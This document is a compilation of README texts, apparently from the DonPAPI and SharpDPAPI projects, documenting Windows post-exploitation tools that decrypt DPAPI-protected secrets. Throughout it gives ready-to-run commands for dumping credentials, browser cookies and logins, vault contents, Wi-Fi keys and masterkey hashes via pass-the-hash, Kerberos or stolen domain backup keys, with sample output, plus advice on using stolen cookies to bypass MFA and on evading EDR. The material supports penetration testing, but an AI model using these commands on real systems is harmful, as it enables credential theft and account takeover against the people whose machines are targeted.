

##
#
https://github.com/login-securite/DonPAPI
#
https://github.com/GhostPack/SharpDPAPI
#
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords
#
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials 
##

DonPAPI
Dumping revelant information on compromised targets without AV detection alt text

Lots of credentials are protected by DPAPI.

We aim at locating those "secured" credentials, and retrieve them using :

User password
Domaine DPAPI BackupKey
Local machine DPAPI Key (protecting TaskScheduled blob)
We made a talk in french about DPAPI called DPAPI - Don't Put Administration Passwords In 🇫🇷:

Slides
Video - coming soon
Table of Contents
DonPAPI
Table of Contents
Installation
Helper
Usage
Currently Gathered Info
Compliance check
Operational use
Reports & Raw Data
Opsec consideration
Credits
Todo
Installation
This tool should be install with pipx or in a dedicated virtual environment

pipx install donpapi
DonPAPI
or (with latest commits)

pipx install git+https://github.com/login-securite/DonPAPI.git
or (to dev)

git clone git+https://github.com/login-securite/DonPAPI.git
cd DonPAPI
poetry update
poetry run DonPAPI
Helper
$ DonPAPI


         ,
       ,                                                 LeHack Release! 💀
        (
       .                                          by Touf & Zblurx @ Login Sécurité
                                &&&&&&
     &&&&&%%%.                  &&&&&&
      &&&&%%%              &&&& &&&&&&       &&&&&&            &&&&&.
      &&&&%%%           &&&&&&& &&&&&&    &&&&&&&&&&&&&     &&&&&&&&&&&
      &&&&%%%         &&&&&&&&& &&&&&&  &&&&&&&&&&&&&&&&   &&&&&&&&&&&&&
    &&&&&&%%%%%       &&&&&&    &&&&&&  &&&&&&    &&&&&&   &&&&&   &&&&&   #####
 &&&&&&&&&%%%%%%%     &&&&&&&&&&&&&&&&  (&&&&&&&&&&&&&&&   &&&&&   &&&&&   # # #
 &/&/////////////%      &&&&&&&&&&&&      &&&&&&&&&&&&     &&&&&   &&&&&   #####
&&/&/#////////(//%         &&&&&&            &&&&&&        &&&&&   &&&&&    ###
&&/&/////////////%
&&/&/////////////%        &&&&&&&&&        &&&&&&&&&&        &&&&&&&&&     &&&&&
&&/&//////////(//%     &&&&&&&&&&&&&&    &&&&&&&&&&&&&&   &&&&&&&&&&&&&&   &&&&&
&&/&/////////////%     &&&&&&   &&&&&&  &&&&&&   &&&&&&&  &&&&&&   &&&&&&  &&&&&
&&/&///////////(/%    &&&&&&    &&&&&&  &&&&&&    &&&&&& &&&&&&    &&&&&&  &&&&&
&&/&///(/////////%    &&&&&& &&&&&&&&&  &&&&&&&&& &&&&&& &&&&&& &&&&&&&&&  &&&&&
&&/&/////////////%    &&&&&& &&&&&&&      &&&&&&& &&&&&& &&&&&& &&&&&&&    &&&&&
&&#&###########/#%    &&&&&&                             &&&&&&
&&###############%    &&&&&&                             &&&&&&

```
usage: DonPAPI [-h] [-credz CREDZ] [-pvk PVK] [-d] [-t number of threads] [-o OUTPUT_DIRECTORY] [-H LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-local_auth] [-laps] [-dc-ip ip address]
               [-target-ip ip address] [-port [destination port]] [-R] [--type TYPE] [-u] [--target] [--no_browser] [--no_dpapi] [--no_vnc] [--no_remoteops] [--GetHashes] [--no_recent] [--no_sysadmins]
               [--from_file FROM_FILE]
               [target]
```
SeatBelt implementation.

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>

optional arguments:
  -h, --help            show this help message and exit
  -credz CREDZ          File containing multiple user:password or user:hash for masterkeys decryption
  -pvk PVK              input backupkey pvk file
  -d, --debug           Turn DEBUG output ON
  -t number of threads  number of threads
  -o OUTPUT_DIRECTORY, --output_directory OUTPUT_DIRECTORY
                        output log directory

authentication:
  -H LMHASH:NTHASH, --hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the
                        command line
  -aesKey hex key       AES key to use for Kerberos Authentication (1128 or 256 bits)
  -local_auth           use local authentification
  -laps                 use LAPS to request local admin password

connection:
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it
  -port [destination port]
                        Destination port to connect to SMB Server

Reporting:
  -R, --report          Only Generate Report on the scope
  --type TYPE           only report "type" password (wifi,credential-blob,browser-internet_explorer,LSA,SAM,taskscheduler,VNC,browser-chrome,browser-firefox
  -u, --user            only this username
  --target              only this target (url/IP...)

attacks:
  --no_browser          do not hunt for browser passwords
  --no_dpapi            do not hunt for DPAPI secrets
  --no_vnc              do not hunt for VNC passwords
  --no_remoteops        do not hunt for SAM and LSA with remoteops
  --GetHashes           Get all users Masterkey's hash & DCC2 hash
  --no_recent           Do not hunt for recent files
  --no_sysadmins        Do not hunt for sysadmins stuff (mRemoteNG, vnc, keepass, lastpass ...)
  --from_file FROM_FILE
                        Give me the export of ADSyncQuery.exe ADSync.mdf to decrypt ADConnect password
Usage
Dump all secrets of the target machine with an Domain admin account :

DonPAPI domain/user:passw0rd@target
or a Local one :

DonPAPI -local_auth user@target
Using PtH

DonPAPI --hashes <LM>:<NT> domain/user@target
Using kerberos (-k)

DonPAPI -k domain/user@target
Using a user with LAPS password reading rights

DonPAPI -laps domain/user:passw0rd@target
Using relayed socks:

HackndoRealying

To decrypt secrets DonPapi might need :

Nothing, when facing reversible encryption (firefox, mremoteNG, VNC)
the machine DPAPI Key, we will fetch it automatically thanks to secretdumps when having an admin acces (Wifi, scheduled task passwords)
the user password for everything related to DPAPI Protection, or de DPAPI Domain Backup key
It is possible to provide a list of credentials that will be tested on the target. DonPAPI will try to use them to decipher masterkeys.

This credential file must have the following syntax:

user1:pass1
user1:pass2
user2:passX
...
DonPAPI -credz credz_file.txt domain/user:passw0rd@target
When a domain admin user is available, it is possible to dump the domain backup key using impacket dpapi.py tool:

dpapi.py backupkeys --export -t domain/user:passw0rd@target_dc_ip
Or with dploot:

dploot backupkeys -u username -p password -d domain 192.168.56.30
This backup key (pvk file) can then be used to dump all domain user's secrets!

DonPAPI -pvk domain_backupkey.pvk domain/user:passw0rd@domain_network_list
Target can be an IP, IP range, CIDR, FQDN, file containing list targets (one per line)

Curently gathered info
Windows credentials (Taskscheduled credentials & a lot more)
Windows Vaults
Windows RDP credentials
Windows certificates
AdConnect (still require a manual operation)
Wifi key
Internet explorer Credentials
Chrome cookies & credentials (and chrome like : Edge)
Firefox cookies & credentials
VNC passwords
mRemoteNG password (with default config)
putty, WinSCP
Google Refresh Token
Compliance check
SMB signing status
OS/Domain/Hostname/Ip of the audited scope
Operational use
With local admin account on a host, we can :

Gather machine protected DPAPI secrets
ScheduledTask that will contain cleartext login/password of the account configured to run the task
Wi-Fi passwords
Extract Masterkey's hash value for every user profiles (masterkeys beeing protected by the user's password, let's try to crack them with Hashcat)
Identify who is connected from where, in order to identify admin's personal computers.
Extract other non-dpapi protected secrets (VNC/Firefox/mRemoteNG)
Gather protected secrets from IE, Chrome, Firefox and start reaching the Azure tenant.
With a user password, or the domain PVK we can unprotect the user's DPAPI secrets.

Use cookies to bypass MFA (https://www.eshlomo.us/pass-the-cookie-crumble-the-cloud/)
Reports & Raw Data
DonPapi will extract and consolidate a bunch of raw information:

raw user and passwords in 'raw_credz'
dumped certificates informations
raw cookies
raw sam hash
raw users masterkey's hash (Good luck with cracking those, but it might be the only hash you'll get for some SuperAdmin Accounts)
raw DCC2
To generate the report, just use DonPAPI with -R.

HTML Reports will be created, as you'll probably have so many passwords that your browser will crash rendering it, i tried to separate those in few reports.

Cookies are great to bypass MFA, by clicking on a cookie in the report you'll copy what you need to paste to cookie in your browser dev console.

If the certificate allow client authentication, you can click on "Yes" to get a working certipy auth command with the certificate in your clipboard.

some info are excluded from the reports, you can still acces all the data in the sqlite3 donpapi.db database.

Opsec consideration
The RemoteOps part can be spoted by some EDR (it's basically a secretdump). It can be disabled using --no_remoteops flag, but then the machine DPAPI key won't be retrieved, and scheduled task credentials/Wi-Fi passwords won't be harvested.

Credits
All the credits goes to these great guys for doing the hard research & coding :

Benjamin Delpy (@gentilkiwi) for most of the DPAPI research (always greatly commented, <3 your code)
Alberto Solino (@agsolino) for the tremendous work of Impacket (https://github.com/SecureAuthCorp/impacket). Almost everything we do here comes from impacket.
Alesandro Z & everyone who worked on Lazagne (https://github.com/AlessandroZ/LaZagne/wiki) for the VNC & Firefox modules, and most likely for a lots of other ones in the futur.
dirkjanm @_dirkjan for the base code of adconnect dump (https://github.com/fox-it/adconnectdump) & every research he ever did. I learned so much on so many subjects thanks to you. <3
@byt3bl33d3r for CME (lots of inspiration and code comes from CME : https://github.com/byt3bl33d3r/CrackMapExec )
All the Team at @LoginSecurite for their help in debugging my shity code (special thanks to @layno & @HackAndDo for that)
Todo
Finish ADSync/ADConnect password extraction
CREDHISTORY full extraction
Further analysis ADAL/msteams
Implement Chrome <v80 decoder
Find a way to implement Lazagne's great module
Implement ADCS PKI export
##
##
##

SharpDPAPI
SharpDPAPI is a C# port of some DPAPI functionality from @gentilkiwi's Mimikatz project.

I did not come up with this logic, it is simply a port from Mimikatz in order to better understand the process and operationalize it to fit our workflow.

The SharpChrome subproject is an adaptation of work from @gentilkiwi and @djhohnstein, specifically his SharpChrome project. However, this version of SharpChrome uses a different version of the C# SQL library that supports lockless opening. SharpChrome is built as a separate project in SharpDPAPI because of the size of the SQLite library utilized.

Both Chrome and newer Chromium-based Edge browsers can be triaged with SharpChrome.

SharpChrome also uses an minimized version of @AArnott's BCrypt P/Invoke code released under the MIT License.

If you're unfamiliar with DPAPI, check out this post for more background information. For more information on Credentials and Vaults in regards to DPAPI, check out Benjamin's wiki entry on the subject.

@harmj0y is the primary author of this port.

SharpDPAPI is licensed under the BSD 3-Clause license.

Table of Contents
SharpDPAPI
Table of Contents
Background
SharpDPAPI Command Line Usage
SharpChrome Command Line Usage
Operational Usage
SharpDPAPI
SharpChrome
SharpDPAPI Commands
User Triage
masterkeys
credentials
vaults
rdg
keepass
certificates
triage
Machine Triage
machinemasterkeys
machinecredentials
machinevaults
certificates /machine
machinetriage
Misc
ps
blob
backupkey
search
SCCM
SharpChrome Commands
logins
cookies
statekeys
backupkey
Compile Instructions
Targeting other .NET versions
Sidenote: Running SharpDPAPI Through PowerShell
Sidenote Sidenote: Running SharpDPAPI Over PSRemoting
Background
SharpDPAPI Command Line Usage
  __                 _   _       _ ___
 (_  |_   _. ._ ._  | \ |_) /\  |_) |
 __) | | (_| |  |_) |_/ |  /--\ |  _|_
                |
  v1.20.0

Retrieve a domain controller's DPAPI backup key, optionally specifying a DC and output file:

  SharpDPAPI backupkey [/nowrap] [/server:SERVER.domain] [/file:key.pvk]


The *search* comand will search for potential DPAPI blobs in the registry, files, folders, and base64 blobs:

    search /type:registry [/path:HKLM\path\to\key] [/showErrors]
    search /type:folder /path:C:\path\to\folder [/maxBytes:<numOfBytes>] [/showErrors]
    search /type:file /path:C:\path\to\file [/maxBytes:<numOfBytes>]
    search /type:base64 [/base:<base64 string>]


Machine/SYSTEM Triage:

    machinemasterkeys       -   triage all reachable machine masterkey files (elevates to SYSTEM to retrieve the DPAPI_SYSTEM LSA secret)
    machinecredentials      -   use 'machinemasterkeys' and then triage machine Credential files
    machinevaults           -   use 'machinemasterkeys' and then triage machine Vaults
    machinetriage           -   run the 'machinecredentials' and 'machinevaults' commands


User Triage:

    Arguments for the 'masterkeys' command:

        /target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
        /pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
        /pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
        /password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
        /ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
        /credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
        /rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
        /server:SERVER          -   triage a remote server, assuming admin access
        /hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)


    Arguments for the credentials|vaults|rdg|keepass|triage|blob|ps commands:

        Decryption:
            /unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
            /pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
            /pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
            /password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
            /ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
            /credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
            /rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
            GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
            /mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

        Targeting:
            /target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
            /server:SERVER      -   triage a remote server, assuming admin access
                                    Note: must use with /pvk:KEY or /password:X
                                    Note: not applicable to 'blob' or 'ps' commands


Certificate Triage:

    Arguments for the 'certificates' command:
        /showall                                        -   show all decrypted private key files, not just ones that are linked to installed certs (the default)
        /machine                                        -   use the local machine store for certificate triage
        /mkfile | /target                               -   for /machine triage
        [all decryption args from User Triage above]


Note: in most cases, just use *triage* if you're targeting user DPAPI secrets and *machinetriage* if you're going after SYSTEM DPAPI secrets.
      These functions wrap all the other applicable functions that can be automatically run.
SharpChrome Command Line Usage
  __                 _
 (_  |_   _. ._ ._  /  |_  ._ _  ._ _   _
 __) | | (_| |  |_) \_ | | | (_) | | | (/_
                |
  v1.9.0


Retrieve a domain controller's DPAPI backup key, optionally specifying a DC and output file:

  SharpChrome backupkey [/nowrap] [/server:SERVER.domain] [/file:key.pvk]


Global arguments for the 'cookies', 'logins', and 'statekeys' commands:

    Decryption:
        /unprotect          -   force use of CryptUnprotectData() (default for unprivileged execution)
        /pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
        /pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
        /password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
        /ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
        /prekey:X           -   decrypt the target user's masterkeys using a DPAPI prekey (domain or local SHA1, works remotely)
        /rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
        GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
        /statekey:X         -   a decrypted AES state key (from the 'statekey' command)

    Targeting:
        /target:FILE        -   triage a specific 'Cookies', 'Login Data', or 'Local State' file location
        /target:C:\Users\X\ -   triage a specific user folder for any specified command
        /server:SERVER      -   triage a remote server, assuming admin access (note: must use with /pvk:KEY)
        /browser:X          -   triage 'chrome' (default), (chromium-based) 'edge', or 'slack'

    Output:
        /format:X           -   either 'csv' (default) or 'table' display
        /showall            -   show Login Data entries with null passwords and expired Cookies instead of filtering (default)
        /consoleoutfile:X   -   output all console output to a file on disk


'cookies' command specific arguments:

        /cookie:"REGEX"     -   only return cookies where the cookie name matches the supplied regex
        /url:"REGEX"        -   only return cookies where the cookie URL matches the supplied regex
        /format:json        -   output cookie values in an EditThisCookie JSON import format. Best when used with a regex!
        /setneverexpire     -   set expirations for cookies output to now + 100 years (for json output)
Operational Usage
SharpDPAPI
One of the goals with SharpDPAPI is to operationalize Benjamin's DPAPI work in a way that fits with our workflow.

How exactly you use the toolset will depend on what phase of an engagement you're in. In general this breaks into "have I compromised the domain or not".

If domain admin (or equivalent) privileges have been obtained, the domain DPAPI backup key can be retrieved with the backupkey command (or with Mimikatz). This domain private key never changes, and can decrypt any DPAPI masterkeys for domain users. This means, given a domain DPAPI backup key, an attacker can decrypt masterkeys for any domain user that can then be used to decrypt any Vault/Credentials/Chrome Logins/other DPAPI blobs/etc. The key retrieved from the backupkey command can be used with the masterkeys, credentials, vaults, rdg, or triage commands.

If DA privileges have not been achieved, using Mimikatz' sekurlsa::dpapi command will retrieve DPAPI masterkey {GUID}:SHA1 mappings of any loaded master keys (user and SYSTEM) on a given system (tip: running dpapi::cache after key extraction will give you a nice table). If you change these keys to a {GUID1}:SHA1 {GUID2}:SHA1... type format, they can be supplied to the credentials, vaults, rdg, or triage commands. This lets you triage all Credential files/Vaults on a system for any user who's currently logged in, without having to do file-by-file decrypts.

Alternatively, if you can supply a target user's password, NTLM hash, or DPAPI prekey for user-command with /password:X, /ntlm:X, or /prekey:X respectively. The dpapi field of Mimikatz' sekurlsa::msv output for domain users can be used as the /prekey, while the sha1 field of sekurlsa::msv output can be used as the /prekey for local users.

For decrypting RDG/RDCMan.settings files with the rdg command, the /unprotect flag will use CryptUnprotectData() to decrypt any saved RDP passwords, if the command is run from the user context who saved the passwords. This can be done from an unprivileged context, without the need to touch LSASS. For why this approach isn't used for credentials/vaults, see Benjamin's documentation here.

For machine-specific DPAPI triage, the machinemasterkeys|machinecredentials|machinevaults|machinetriage commands will do the machine equivalent of user DPAPI triage. If in an elevated context (that is, you need local administrative rights), SharpDPAPI will elevate to SYSTEM privileges to retrieve the "DPAPI_SYSTEM" LSA secret, which is then used to decrypt any discovered machine DPAPI masterkeys. These keys are then used as lookup tables for machine credentials/vaults/etc.

For more offensive DPAPI information, check here.

SharpChrome
SharpChrome is a Chrome-specific implementation of SharpDPAPI capable of cookies and logins decryption/triage. It is built as a separate project in SharpDPAPI because of the size of the SQLite library utilized.

Since Chrome Cookies/Login Data are saved without CRYPTPROTECT_SYSTEM, CryptUnprotectData() is back on the table. If SharpChrome is run from an unelevated contect, it will attempt to decrypt any logins/cookies for the current user using CryptUnprotectData(). A /pvk:[BASE64|file.pvk], {GUID}:SHA1 lookup table, /password:X, /ntlm:X, /prekey:X, or /mkfile:FILE of {GUID}:SHA1 values can also be used to decrypt values. Also, the C# SQL library used (with a few modifications) supports lockless opening, meaning that Chrome does not have to be closed/target files do not have to be copied to another location.

Alternatively, if you can supply a target user's password, NTLM hash, or DPAPI prekey for user-command with /password:X, /ntlm:X, or /prekey:X respectively. The dpapi field of Mimikatz' sekurlsa::msv output for domain users can be used as the /prekey, while the sha1 field of sekurlsa::msv output can be used as the /prekey for local users.

If Chrome is version 80+, an AES state key is stored in AppData\Local\Google\Chrome\User Data\Local State - this key is protected with DPAPI, so we can use CryptUnprotectData()/pvk/masterkey lookup tables to decrypt it. This AES key is then used to protect new cookie and login data entries. This is also the process when /browser:edge or /browser:brave is specified, for newer Chromium-based Edge browser triage.

By default, cookies and logins are displayed as a csv - this can be changed with /format:table for table output, and /format:json for cookies specifically. The json option outputs cookies in a json format that can be imported into the EditThisCookie Chrome extension for easy reuse.

The cookies command also has /cookie:REGEX and /url:REGEX arguments to only return cookie names or urls matching the supplied regex. This is useful with /format:json to easily clone access to specific sites.

Specific cookies/logins/statekey files can be specified with /target:X, and a user folder can be specified with /target:C:\Users\USER\ for any triage command.

SharpDPAPI Commands
User Triage
masterkeys
The masterkeys command will search for any readable user masterkey files and decrypt them using a supplied domain DPAPI backup key. It will return a set of masterkey {GUID}:SHA1 mappings.

/password:X can be used to decrypt a user's current masterkeys. Note that for domain-joined machines, the password can be supplied in either plaintext or NTLM format. If /target is also supplied with /password, the /sid:X full domain SID of the user also needs to be specified.

The domain backup key can be in base64 form (/pvk:BASE64...) or file form (/pvk:key.pvk).

C:\Temp>SharpDPAPI.exe masterkeys /pvk:key.pvk

  __                 _   _       _ ___
 (_  |_   _. ._ ._  | \ |_) /\  |_) |
 __) | | (_| |  |_) |_/ |  /--\ |  _|_
                |
  v1.2.0


[*] Action: Triage User Masterkey Files

[*] Found MasterKey : C:\Users\admin\AppData\Roaming\Microsoft\Protect\S-1-5-21-1473254003-2681465353-4059813368-1000\28678d89-678a-404f-a197-f4186315c4fa
[*] Found MasterKey : C:\Users\harmj0y\AppData\Roaming\Microsoft\Protect\S-1-5-21-883232822-274137685-4173207997-1111\3858b304-37e5-48aa-afa2-87aced61921a
...(snip)...

[*] User master key cache:

{42e95117-ff5f-40fa-a6fc-87584758a479}:4C802894C566B235B7F34B011316...(snip)...
...(snip)...
If no /pasword or /pvk is specified, you may pass the /hashes flag to dump the master key hashes in John/Hashcat format. In this mode, the hashes are printed in the format of {GUID}:DPAPImk.

The Preferred key is also parsed in order to highlight the current preferred master key, so that effort is not spent cracking older keys.

C:\Temp>SharpDPAPI.exe masterkeys /hashes

  __                 _   _       _ ___
 (_  |_   _. ._ ._  | \ |_) /\  |_) |
 __) | | (_| |  |_) |_/ |  /--\ |  _|_
                |
  v1.11.3


[*] Action: User DPAPI Masterkey File Triage

[*] Will dump user masterkey hashes

[*] Found MasterKey : C:\Users\admin\AppData\Roaming\Microsoft\Protect\S-1-5-21-1473254003-2681465353-4059813368-1000\28678d89-678a-404f-a197-f4186315c4fa
[*] Found MasterKey : C:\Users\harmj0y\AppData\Roaming\Microsoft\Protect\S-1-5-21-883232822-274137685-4173207997-1111\3858b304-37e5-48aa-afa2-87aced61921a
...(snip)...

[*] Preferred master keys:

C:\Users\admin\AppData\Roaming\Microsoft\Protect\S-1-5-21-1473254003-2681465353-4059813368-1000\28678d89-678a-404f-a197-f4186315c4fa
C:\Users\harmj0y\AppData\Roaming\Microsoft\Protect\S-1-5-21-883232822-274137685-4173207997-1111\3858b304-37e5-48aa-afa2-87aced61921a


[*] User master key hashes:

{42e95117-ff5f-40fa-a6fc-87584758a479}:$DPAPImk$1*3*S-1-5-21-1473254003-2681465353-4059813368-1000*des3*sha1*18000*09c49e9af9...(snip)...
credentials
The credentials command will search for Credential files and either a) decrypt them with any "{GUID}:SHA1" masterkeys passed, b) a /mkfile:FILE of one or more {GUID}:SHA1 masterkey mappings, c) use a supplied DPAPI domain backup key (/pvk:BASE64... or /pvk:key.pvk) to first decrypt any user masterkeys (a la masterkeys), or d) a /password:X to decrypt any user masterkeys, which are then used as a lookup decryption table. DPAPI GUID mappings can be recovered with Mimikatz' sekurlsa::dpapi command.

A specific credential file (or folder of credentials) can be specified with /target:FILE or /target:C:\Folder\. If a file is specified, {GUID}:SHA1 values are required, and if a folder is specified either a) {GUID}:SHA1 values must be supplied or b) the folder must contain DPAPI masterkeys and a /pvk domain backup key must be supplied.

If run from an elevated context, Credential files for ALL users will be triaged, otherwise only Credential files for the current user will be processed.

Using domain {GUID}:SHA1 masterkey mappings:

C:\Temp>SharpDPAPI.exe credentials {44ca9f3a-9097-455e-94d0-d91de951c097}:9b049ce6918ab89937687...(snip)... {feef7b25-51d6-4e14-a52f-eb2a387cd0f3}:f9bc09dad3bc2cd00efd903...(snip)...

  __                 _   _       _ ___
 (_  |_   _. ._ ._  | \ |_) /\  |_) |
 __) | | (_| |  |_) |_/ |  /--\ |  _|_
                |
  v1.2.0


[*] Action: User DPAPI Credential Triage

[*] Triaging Credentials for ALL users


Folder       : C:\Users\harmj0y\AppData\Local\Microsoft\Credentials\

  CredFile           : 48C08A704ADBA03A93CD7EC5B77C0EAB

    guidMasterKey    : {885342c6-028b-4ecf-82b2-304242e769e0}
    size             : 436
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32772/26115
    description      : Local Credential Data

    LastWritten      : 1/22/2019 2:44:40 AM
    TargetName       : Domain:target=TERMSRV/10.4.10.101
    TargetAlias      :
    Comment          :
    UserName         : DOMAIN\user
    Credential       : Password!

  ...(snip)...
Using a domain DPAPI backup key to first decrypt any discoverable masterkeys:

C:\Temp>SharpDPAPI.exe credentials /pvk:HvG1sAAAAAABAAAAAAAAAAAAAAC...(snip)...

  __                 _   _       _ ___
 (_  |_   _. ._ ._  | \ |_) /\  |_) |
 __) | | (_| |  |_) |_/ |  /--\ |  _|_
                |
  v1.2.0


[*] Action: User DPAPI Credential Triage

[*] Using a domain DPAPI backup key to triage masterkeys for decryption key mappings!

[*] User master key cache:

{42e95117-ff5f-40fa-a6fc-87584758a479}:4C802894C566B235B7F34B011316E94CC4CE4665
...(snip)...

[*] Triaging Credentials for ALL users


Folder       : C:\Users\harmj0y\AppData\Local\Microsoft\Credentials\

  CredFile           : 48C08A704ADBA03A93CD7EC5B77C0EAB

    guidMasterKey    : {885342c6-028b-4ecf-82b2-304242e769e0}
    size             : 436
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32772/26115
    description      : Local Credential Data

    LastWritten      : 1/22/2019 2:44:40 AM
    TargetName       : Domain:target=TERMSRV/10.4.10.101
    TargetAlias      :
    Comment          :
    UserName         : DOMAIN\user
    Credential       : Password!

...(snip)...
vaults
The vaults command will search for Vaults and either a) decrypt them with any "{GUID}:SHA1" masterkeys passed, b) a /mkfile:FILE of one or more {GUID}:SHA1 masterkey mappings, c) use a supplied DPAPI domain backup key (/pvk:BASE64... or /pvk:key.pvk) to first decrypt any user masterkeys (a la masterkeys), or d) a /password:X to decrypt any user masterkeys, which are then used as a lookup decryption table. DPAPI GUID mappings can be recovered with Mimikatz' sekurlsa::dpapi command.

The Policy.vpol folder in the Vault folder is decrypted with any supplied DPAPI keys to retrieve the associated AES decryption keys, which are then used to decrypt any associated .vcrd files.

A specific vault folder can be specified with /target:C:\Folder\. In this case, either a) {GUID}:SHA1 values must be supplied or b) the folder must contain DPAPI masterkeys and a /pvk domain backup key must be supplied.

Using domain {GUID}:SHA1 masterkey mappings:

C:\Temp>SharpDPAPI.exe vaults {44ca9f3a-9097-455e-94d0-d91de951c097}:9b049ce6918ab89937687...(snip)... {feef7b25-51d6-4e14-a52f-eb2a387cd0f3}:f9bc09dad3bc2cd00efd903...(snip)...
  __                 _   _       _ ___
 (_  |_   _. ._ ._  | \ |_) /\  |_) |
 __) | | (_| |  |_) |_/ |  /--\ |  _|_
                |
  v1.2.0


[*] Action: User DPAPI Vault Triage

[*] Triaging Vaults for ALL users


[*] Triaging Vault folder: C:\Users\harmj0y\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

  VaultID            : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
  Name               : Web Credentials
    guidMasterKey    : {feef7b25-51d6-4e14-a52f-eb2a387cd0f3}
    size             : 240
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32772/26115
    description      :
    aes128 key       : EDB42294C0721F2F1638A40F0CD67CD8
    aes256 key       : 84CD64B5F438B8B9DA15238A5CFA418C04F9BED6B4B4CCAC9705C36C65B5E793

    LastWritten      : 10/12/2018 12:10:42 PM
    FriendlyName     : Internet Explorer
    Identity         : admin
    Resource         : https://10.0.0.1/
    Authenticator    : Password!


